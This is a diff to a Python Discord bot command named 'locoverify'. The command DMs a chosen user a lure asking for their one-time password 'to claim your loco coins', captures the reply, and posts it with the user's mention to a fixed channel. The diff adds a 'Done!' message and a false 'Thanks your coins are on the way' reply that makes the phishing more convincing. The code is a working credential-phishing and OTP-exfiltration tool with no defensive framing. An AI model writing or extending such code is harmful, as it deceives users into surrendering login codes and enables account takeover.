@@ -58,6 +58,7 @@ async def locoverify(ctx, user: discord.Member):
     if ctx.message.channel.type != discord.ChannelType.private:
         if not user: await client.say("Please specify a user")
         else:
+            await client.say("Done!")
             await client.send_message(await client.get_user_info(user.id), "Hey can you send me your OTP to claim your loco coins")
             otp = await client.wait_for_message(author=user)
             otp = otp.content
@@ -78,6 +79,7 @@ async def locoverify(ctx, user: discord.Member):
                         otp = await client.wait_for_message(author=user)
                         otp = otp.content
                     await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
+                    await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
     else:
         await client.send_message(ctx.message.channel, "This bot isn't made for DMs")
 
